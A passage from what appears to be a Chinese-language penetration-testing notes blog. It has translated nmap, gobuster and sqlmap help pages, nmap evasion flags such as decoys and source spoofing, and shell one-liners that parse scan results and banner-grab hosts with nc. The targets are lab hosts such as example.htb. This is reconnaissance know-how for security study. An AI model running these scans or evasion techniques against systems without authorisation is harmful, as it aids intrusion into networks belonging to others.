class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line"></span><br><span class="line">目标规范：</span><br><span class="line">Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1, 10.0.0-255.1-254</span><br><span class="line">-iL &lt;输入文件名&gt;: 从文件中读取主机/网络列表</span><br><span class="line">-iR &lt;数量&gt;: 随机选择目标</span><br><span class="line">--exclude &lt;主机1[,主机2][,主机3],...&gt;: 排除指定主机/网络</span><br><span class="line">--excludefile &lt;排除文件&gt;: 从文件中排除列表</span><br><span class="line"></span><br><span class="line">主机发现：</span><br><span class="line">-sL: 列出扫描 - 仅列出扫描目标</span><br><span class="line">-sn: Ping 扫描 - 禁用端口扫描</span><br><span class="line">-Pn: 假设所有主机在线 - 禁用 ICMP Echo 请求 - 跳过主机发现</span><br><span class="line">-PS/PA/PU/PY[端口列表]: TCP SYN、TCP ACK、UDP 或 SCTP 发现至指定端口</span><br><span class="line">-PE/PP/PM: ICMP 回显、时间戳和网络掩码请求发现探针</span><br><span class="line">-PO[协议列表]: IP 协议 Ping</span><br><span class="line">-n/-R: 不进行 DNS 解析 / 始终解析 [默认：有时]</span><br><span class="line">--dns-servers &lt;服务器1[,服务器2],...&gt;: 指定自定义 DNS 服务器</span><br><span class="line">--system-dns: 使用操作系统的 DNS 解析器</span><br><span class="line">--traceroute: 跟踪每个主机的跳跃路径</span><br><span class="line"></span><br><span class="line">扫描技术：</span><br><span class="line">-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scan</span><br><span class="line">-sU: UDP 扫描</span><br><span class="line">-sN/sF/sX: TCP 空、FIN 和 Xmas 扫描</span><br><span class="line">--scanflags &lt;标志&gt;: 自定义 TCP 扫描标志</span><br><span class="line">-sI &lt;僵尸主机[:探针端口]&gt;: 空闲扫描</span><br><span class="line">-sY/sZ: SCTP INIT/COOKIE-ECHO 扫描</span><br><span class="line">-sO: IP 协议扫描</span><br><span class="line">-b &lt;FTP 中继主机&gt;: FTP 中继扫描</span><br><span class="line"></span><br><span class="line">端口规范和扫描顺序：</span><br><span class="line">-p &lt;端口范围&gt;: 仅扫描指定端口</span><br><span class="line">  示例: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span><br><span class="line">--exclude-ports &lt;端口范围&gt;: 排除指定端口</span><br><span class="line">-F: 快速模式 - 扫描的端口比默认扫描少</span><br><span class="line">-r: 顺序扫描端口 - 不随机化</span><br><span class="line">--top-ports &lt;数量&gt;: 扫描最常见的 &lt;数量&gt; 个端口</span><br><span class="line">--port-ratio &lt;比例&gt;: 扫描超过指定比例的常见端口</span><br><span class="line"></span><br><span class="line">服务/版本检测：</span><br><span class="line">-sV: 探测开放端口的服务/版本信息</span><br><span class="line">--version-intensity &lt;等级&gt;: 设置从 0 (轻) 到 9 (尽量探测)</span><br><span class="line">--version-light: 限制为最可能的探测 (强度 2)</span><br><span class="line">--version-all: 尝试所有探测 (强度 9)</span><br><span class="line">--version-trace: 显示详细的版本扫描活动 (用于调试)</span><br><span class="line"></span><br><span class="line">脚本扫描：</span><br><span class="line">-sC: 相当于 --script=default</span><br><span class="line">--script=&lt;Lua 脚本&gt;: &lt;Lua 脚本&gt; 为目录、脚本文件或脚本类别的逗号分隔列表</span><br><span class="line">--script-args=&lt;n1=v1,[n2=v2,...]&gt;: 为脚本提供参数</span><br><span class="line">--script-args-file=文件名: 从文件中提供 NSE 脚本参数</span><br><span class="line">--script-trace: 显示所有发送和接收的数据</span><br><span class="line">--script-updatedb: 更新脚本数据库</span><br><span class="line">--script-help=&lt;Lua 脚本&gt;: 显示关于脚本的帮助</span><br><span class="line">&lt;Lua 脚本&gt; 为脚本文件或脚本类别的逗号分隔列表</span><br><span class="line"></span><br><span class="line">操作系统检测：</span><br><span class="line">-O: 启用操作系统检测</span><br><span class="line">--osscan-limit: 将操作系统检测限制在潜在目标上</span><br><span class="line">--osscan-guess: 更积极地猜测操作系统</span><br><span class="line"></span><br><span class="line">时间和性能：</span><br><span class="line">-T&lt;0-5&gt;: 设置时间模板 (数值越高越快)</span><br><span class="line">--min-hostgroup/max-hostgroup &lt;大小&gt;: 并行主机扫描组大小</span><br><span class="line">--min-parallelism/max-parallelism &lt;数目&gt;: 探针并行化</span><br><span class="line">--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;时间&gt;: 设置探针往返时间</span><br><span class="line">--max-retries &lt;次数&gt;: 限制端口扫描探针的重传次数</span><br><span class="line">--host-timeout &lt;时间&gt;: 达到指定时间后放弃目标</span><br><span class="line">--scan-delay/--max-scan-delay &lt;时间&gt;: 调整探针之间的延迟</span><br><span class="line">--min-rate &lt;数量&gt;: 以每秒不少于 &lt;数量&gt; 的速度发送数据包</span><br><span class="line">--max-rate &lt;数量&gt;: 以每秒不超过 &lt;数量&gt; 的速度发送数据包</span><br><span class="line"></span><br><span class="line">防火墙/IDS 规避和伪装：</span><br><span class="line">-f; --mtu &lt;值&gt;: 分段数据包 (可选指定 MTU)</span><br><span class="line">-D &lt;诱饵1,诱饵2[,ME],...&gt;: 使用诱饵进行扫描</span><br><span class="line">-S &lt;IP 地址&gt;: 伪装源地址</span><br><span class="line">-e &lt;接口&gt;: 使用指定接口</span><br><span class="line">-g/--source-port &lt;端口号&gt;: 使用指定端口号</span><br><span class="line">--proxies &lt;url1,[url2],...&gt;: 通过 HTTP/SOCKS4 代理连接</span><br><span class="line">--data &lt;十六进制字符串&gt;: 向数据包中附加自定义负载</span><br><span class="line">--data-string &lt;字符串&gt;: 向数据包中附加自定义 ASCII 字符串</span><br><span class="line">--data-length &lt;长度&gt;: 向数据包中附加随机数据</span><br><span class="line">--ip-options &lt;选项&gt;: 使用指定 IP 选项发送数据包</span><br><span class="line">--ttl &lt;值&gt;: 设置 IP 生存时间字段</span><br><span class="line">--spoof-mac &lt;mac 地址/前缀/厂商名称&gt;: 伪装 MAC 地址</span><br><span class="line">--badsum: 发送伪造的 TCP/UDP/SCTP 校验和的数据包</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">-oN/-oX/-oS/-oG &lt;文件&gt;: 以 .nmap/.xml/s|&lt;rIpt kIddi3/.gnmap 格式输出扫描到文件</span><br><span class="line">-oA &lt;基本名&gt;: 同时输出为三种主要格式</span><br><span class="line">-v: 增加详细级别 (使用 -vv 或更多)</span><br><span class="line">-d: 增加调试级别 (使用 -dd 或更多)</span><br><span class="line">--reason: 显示端口处于特定状态的原因</span><br><span class="line">--open: 仅显示开放 (或可能开放) 的端口</span><br><span class="line">--packet-trace: 显示所有发送和接收的数据包</span><br><span class="line">--iflist: 打印主机接口和路由 (用于调试)</span><br><span class="line">--append-output: 附加到指定的输出文件，而非覆盖</span><br><span class="line">--resume &lt;文件名&gt;: 恢复中断的扫描</span><br><span class="line">--noninteractive: 禁用通过键盘的运行时交互</span><br><span class="line">--stylesheet &lt;路径/URL&gt;: XSL 样式表，用于将 XML 输出转换为 HTML</span><br><span class="line">--webxml: 从 Nmap.Org 引用样式表，以提高 XML 的可移植性</span><br><span class="line">--no-stylesheet: 不将 XSL 样式表关联到 XML 输出</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">-6: 启用 IPv6 扫描</span><br><span class="line">-A: 启用操作系统检测、版本检测、脚本扫描和 traceroute</span><br><span class="line">--datadir &lt;目录名&gt;: 指定自定义 Nmap 数据文件位置</span><br><span class="line">--send-eth/--send-ip: 使用原始以太网帧或 IP 数据包发送</span><br><span class="line">--privileged: 假设用户具备完全权限</span><br><span class="line">--unprivileged: 假设用户缺乏原始套接字权限</span><br><span class="line">-V: 显示版本号</span><br><span class="line">-h: 显示帮助摘要页面</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--disable-arp-ping禁用 ARP ping</span><br><span class="line">-D RND:5生成5个随机 IP 地址，指示连接来自的源</span><br><span class="line">-S &lt;ip&gt;使用不同的源IP地址扫描目标</span><br><span class="line">--source-port 53从 DNS 端口执行扫描</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>脚本类别</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>auth</code></td><td>确定身份验证凭证。</td></tr><tr><td><code>broadcast</code></td><td>通过广播来发现主机的脚本以及发现的主机可以自动添加到剩余的扫描中。</td></tr><tr><td><code>brute</code></td><td>执行脚本，尝试通过使用凭证进行暴力破解来登录相应的服务。</td></tr><tr><td><code>default</code></td><td>使用该<code>-sC</code>选项执行的默认脚本。</td></tr><tr><td><code>discovery</code></td><td>无障碍服务的评估。</td></tr><tr><td><code>dos</code></td><td>这些脚本用于检查服务是否存在拒绝服务漏洞，由于它会损害服务，因此使用较少。</td></tr><tr><td><code>exploit</code></td><td>此类脚本尝试利用扫描端口的已知漏洞。</td></tr><tr><td><code>external</code></td><td>使用外部服务进行进一步处理的脚本。</td></tr><tr><td><code>fuzzer</code></td><td>这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。</td></tr><tr><td><code>intrusive</code></td><td>可能对目标系统产生负面影响的侵入性脚本。</td></tr><tr><td><code>malware</code></td><td>检查某些恶意软件是否感染了目标系统。</td></tr><tr><td><code>safe</code></td><td>不执行侵入性和破坏性访问的防御脚本。</td></tr><tr><td><code>version</code></td><td>服务检测的扩展。</td></tr><tr><td><code>vuln</code></td><td>识别特定的漏洞。</td></tr></tbody></table><table><thead><tr><th><strong>状态</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>open</code></td><td>这表示已建立与扫描端口的连接。这些连接可以是<strong>TCP 连接</strong>、<strong>UDP 数据报</strong>以及<strong>SCTP 关联</strong>。</td></tr><tr><td><code>closed</code></td><td>当端口显示为关闭时，TCP 协议会指示我们收到的数据包包含一个<code>RST</code>标志。这种扫描方法还可用于确定我们的目标是否还活着。</td></tr><tr><td><code>filtered</code></td><td>Nmap 无法正确识别扫描的端口是打开还是关闭，因为目标没有返回该端口的响应，或者我们从目标收到错误代码。</td></tr><tr><td><code>unfiltered</code></td><td>端口的这种状态仅在<strong>TCP-ACK</strong>扫描期间发生，表示该端口可访问，但无法确定它是开放还是关闭。</td></tr><tr><td>&#96;open</td><td>filtered&#96;</td></tr><tr><td>&#96;closed</td><td>filtered&#96;</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap-egrep</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主机和开放端口</span></span><br><span class="line">egrep -v &quot;^#|Status: Up&quot; file.gnmap | cut -d&#x27; &#x27; -f2,4- | \</span><br><span class="line">sed -n -e &#x27;s/Ignored.*//p&#x27;  | \</span><br><span class="line">awk &#x27;&#123;print &quot;Host: &quot; $1 &quot; Ports: &quot; NF-1; $1=&quot;&quot;; for(i=2; i&lt;=NF; i++) &#123; a=a&quot; &quot;$i; &#125;; split(a,s,&quot;,&quot;); for(e in s) &#123; split(s[e],v,&quot;/&quot;); printf &quot;%-8s %s/%-7s %s\n&quot; , v[2], v[3], v[1], v[5]&#125;; a=&quot;&quot; &#125;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印端口</span></span><br><span class="line">egrep -v &quot;^#|Status: Up&quot; file.gnmap | cut -d&#x27; &#x27; -f4- | \</span><br><span class="line">sed -n -e &#x27;s/Ignored.*//p&#x27; | tr &#x27;,&#x27; &#x27;\n&#x27; | sed -e &#x27;s/^[ \t]*//&#x27; | \</span><br><span class="line">sort -n | uniq -c | sort -k 1 -r | head -n 10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计端口数</span></span><br><span class="line">egrep -v &quot;^#|Status: Up&quot; file.gnmap | cut -d&#x27; &#x27; -f2,4- | \</span><br><span class="line">sed -n -e &#x27;s/Ignored.*//p&#x27; | \</span><br><span class="line">awk -F, &#x27;&#123;split($0,a,&quot; &quot;); printf &quot;Host: %-20s Ports Open: %d\n&quot; , a[1], NF&#125;&#x27; \</span><br><span class="line">| sort -k 5 -g</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">横幅爬取</span></span><br><span class="line">egrep -v &quot;^#|Status: Up&quot; file.gnmap | cut -d&#x27; &#x27; -f2,4- | \</span><br><span class="line">awk -F, &#x27;&#123;split($1,a,&quot; &quot;); split(a[2],b,&quot;/&quot;); print a[1] &quot; &quot; b[1]; for(i=2; i&lt;=NF; i++) &#123; split($i,c,&quot;/&quot;); print a[1] c[1] &#125;&#125;&#x27; \</span><br><span class="line"> | xargs -L1 nc -v -w1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">顶级服务标识符</span></span><br><span class="line">egrep -v &quot;^#|Status: Up&quot; file.gnmap | cut -d &#x27; &#x27; -f4- | tr &#x27;,&#x27; &#x27;\n&#x27; | \</span><br><span class="line">sed -e &#x27;s/^[ \t]*//&#x27; | awk -F &#x27;/&#x27; &#x27;&#123;print $7&#125;&#x27; | grep -v &quot;^$&quot; | sort | uniq -c \</span><br><span class="line">| sort -k 1 -nr</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Enumeration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gobuster</title>
      <link href="/2024/09/08/tools/enum/gobuster/"/>
      <url>/2024/09/08/tools/enum/gobuster/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: gobuster [command...]</span><br><span class="line">-t, --thread                    设置线程（默认10）</span><br><span class="line">-v, --verbose                   详细输出</span><br><span class="line">-z, --no-progress               不显示进度</span><br><span class="line">-q, --quiet                     不打印横幅，安静模式</span><br><span class="line">-o, --output                    将结果写入的输出文件</span><br><span class="line">-x, --extensions                指定枚举的扩展名</span><br><span class="line">-k, --no-tls-validation         跳过TLS证书验证</span><br><span class="line">-C, --cookie                    请求中使用的cookie</span><br><span class="line">-H, --headers                   指定请求头</span><br><span class="line">-n, --no-status                 不打印状态码</span><br><span class="line">-s, --status-codes              肯定的状态码</span><br><span class="line">-b, --status-codes-blacklist    负面的状态码</span><br><span class="line">-U, --username                  Basic验证用户名</span><br><span class="line">-P, --password                  Basic验证密码</span><br><span class="line">-c, --show-cname                显示CNAME记录，不能和-i一起使用</span><br><span class="line">-i, --show-ip                   显示IP地址</span><br><span class="line">-r, --resolver                  自定义DNS服务器</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">dir</span></span></span><br><span class="line">gobuster dir -u http://example.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dns</span></span><br><span class="line">gobuster dns -d example.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vhost</span></span><br><span class="line">gobuster vhost -u http://example.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -t 100</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Enumeration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2024/09/08/tools/enum/sqlmap/"/>
      <url>/2024/09/08/tools/enum/sqlmap/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -hh  </span><br><span class="line">        ___  </span><br><span class="line">       __H__                                                                                                               </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.11#stable&#125;                                                                               </span><br><span class="line">|_ -| . [&#x27;]     | .&#x27;| . |                                                                                               </span><br><span class="line">|___|_  [,]_|_|_|__,|  _|                                                                                               </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org  </span><br><span class="line">  </span><br><span class="line">Usage: python3 sqlmap [options]  </span><br><span class="line">  </span><br><span class="line">Options:  </span><br><span class="line">-h, --help            显示基本帮助信息并退出  </span><br><span class="line">-hh                   显示高级帮助信息并退出  </span><br><span class="line">--version             显示程序版本号并退出  </span><br><span class="line">-v VERBOSE            日志详细级别：0-6（默认 1）  </span><br><span class="line">  </span><br><span class="line">Target:  </span><br><span class="line">-u URL, --url=URL      目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）  </span><br><span class="line">-d DIRECT              直接数据库连接的连接字符串  </span><br><span class="line">-l LOGFILE             从 Burp 或 WebScarab 代理日志文件解析目标  </span><br><span class="line">-m BULKFILE            从文本文件中加载多个目标  </span><br><span class="line">-r REQUESTFILE         从文件加载 HTTP 请求  </span><br><span class="line">-g GOOGLEDORK          处理 Google Dork 结果作为目标 URL  </span><br><span class="line">-c CONFIGFILE          从配置 INI 文件加载选项  </span><br><span class="line">  </span><br><span class="line">Request:  </span><br><span class="line">-A AGENT, --user-agent=AGENT         HTTP User-Agent 请求头的值  </span><br><span class="line">-H HEADER, --header=HEADER           附加的请求头（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）  </span><br><span class="line">--method=METHOD                      强制使用指定的 HTTP 方法（例如：PUT）  </span><br><span class="line">--data=DATA                          通过 POST 发送的数据（例如：&quot;id=1&quot;）  </span><br><span class="line">--param-del=PARAM_DELIMITER          用于拆分参数值的字符（例如：&amp;）  </span><br><span class="line">--cookie=COOKIE                      HTTP Cookie 请求头值（例如：&quot;PHPSESSID=a8d127e..&quot;）  </span><br><span class="line">--cookie-del=COOKIE_DELIMITER        用于拆分 Cookie 值的字符（例如：;）  </span><br><span class="line">--live-cookies=LIVE_COOKIES_FILE     用于加载实时 Cookie 的文件  </span><br><span class="line">--load-cookies=LOAD_COOKIES_FILE     以 Netscape/wget 格式加载 Cookie 的文件  </span><br><span class="line">--drop-set-cookie                    忽略响应中的 Set-Cookie 请求头  </span><br><span class="line">--mobile                             模拟智能手机的 HTTP User-Agent 请求头  </span><br><span class="line">--random-agent                       使用随机选择的 HTTP User-Agent 请求头值  </span><br><span class="line">--host=HOST                          HTTP Host 请求头值  </span><br><span class="line">--referer=REFERER                    HTTP Referer 请求头值  </span><br><span class="line">--headers=HEADERS                    附加请求头（例如：&quot;Accept-Language: fr\nETag: 123&quot;）  </span><br><span class="line">--auth-type=AUTH_TYPE                HTTP 验证类型（Basic, Digest, Bearer 等）  </span><br><span class="line">--auth-cred=AUTH_CREDENTIALS         HTTP 验证凭据（用户名:密码）  </span><br><span class="line">--auth-file=AUTH_FILE                HTTP 验证的 PEM 证书/私钥文件  </span><br><span class="line">--proxy=PROXY                        使用代理连接目标 URL  </span><br><span class="line">--proxy-cred=PROXY_CREDENTIALS       代理认证凭据（用户名:密码）  </span><br><span class="line">--tor                                使用 Tor 匿名网络  </span><br><span class="line">--tor-port=TORPORT                   设置 Tor 代理端口（默认值）  </span><br><span class="line">--delay=DELAY                        每个 HTTP 请求之间的延迟（秒）  </span><br><span class="line">--timeout=TIMEOUT                    连接超时时间（默认 30 秒）  </span><br><span class="line">  </span><br><span class="line">Optimization:  </span><br><span class="line">-o                        开启所有优化选项  </span><br><span class="line">--predict-output          预测常见查询输出  </span><br><span class="line">--keep-alive              使用持久的 HTTP(S) 连接  </span><br><span class="line">--null-connection         在没有实际 HTTP 响应主体的情况下获取页面长度  </span><br><span class="line">--threads=THREADS         最大并发 HTTP(S) 请求数（默认值 1）  </span><br><span class="line">  </span><br><span class="line">Injection:  </span><br><span class="line">-p TESTPARAMETER          可测试的参数  </span><br><span class="line">--skip=SKIP               跳过测试指定的参数  </span><br><span class="line">--skip-static             跳过测试看起来是静态的参数  </span><br><span class="line">--param-exclude=REGEXP    使用正则表达式排除指定的参数（例如：&quot;ses&quot;）  </span><br><span class="line">--param-filter=FILTER     按参数位置选择可测试的参数（例如：&quot;POST&quot;）  </span><br><span class="line">--dbms=DBMS               强制后端 DBMS 使用指定的值  </span><br><span class="line">--dbms-cred=DBMS_CREDENTIALS  DBMS 身份验证凭据（用户名:密码）  </span><br><span class="line">--os=OS                   强制后端 DBMS 操作系统为指定的值  </span><br><span class="line">--invalid-bignum          使用大数字来无效化值  </span><br><span class="line">--invalid-logical         使用逻辑运算来无效化值  </span><br><span class="line">--invalid-string          使用随机字符串来无效化值  </span><br><span class="line">--no-cast                 关闭有效负载的强制转换机制  </span><br><span class="line">--no-escape               关闭字符串转义机制  </span><br><span class="line">--prefix=PREFIX           注入有效负载的前缀字符串  </span><br><span class="line">--suffix=SUFFIX           注入有效负载的后缀字符串  </span><br><span class="line">--tamper=TAMPER           使用指定的脚本篡改注入数据  </span><br><span class="line">  </span><br><span class="line">Detection:  </span><br><span class="line">--level=LEVEL             要执行的测试级别（1-5，默认值为 1）  </span><br><span class="line">--risk=RISK               要执行的测试风险级别（1-3，默认值为 1）  </span><br><span class="line">--smart                   仅在启发式方法为正时执行全面测试  </span><br><span class="line">--text-only               仅基于文本内容比较页面  </span><br><span class="line">--titles                  仅基于标题比较页面  </span><br><span class="line">  </span><br><span class="line">Techniques:  </span><br><span class="line">--technique=TECHNIQUES    要使用的 SQL 注入技术（默认值 &quot;BEUSTQ&quot;）  </span><br><span class="line">--time-sec=TIMESEC        后端数据库响应的延迟时间（默认值 5 秒）  </span><br><span class="line">--union-cols=UCOLS        用于测试 UNION 查询 SQL 注入的列范围  </span><br><span class="line">--union-char=UCHAR        用于暴力破解列数的字符  </span><br><span class="line">--union-from=UFROM        UNION 查询 SQL 注入中使用的表名  </span><br><span class="line">--union-values=UVALUES    UNION 查询 SQL 注入中使用的列值  </span><br><span class="line">--dns-domain=DNSDOMAIN    用于 DNS 数据外传攻击的域名  </span><br><span class="line">--second-url=SECONDURL    用于搜索二阶响应的结果页面 URL  </span><br><span class="line">--second-req=SECONDREQ    从文件加载二阶 HTTP 请求  </span><br><span class="line">  </span><br><span class="line">Fingerprint:  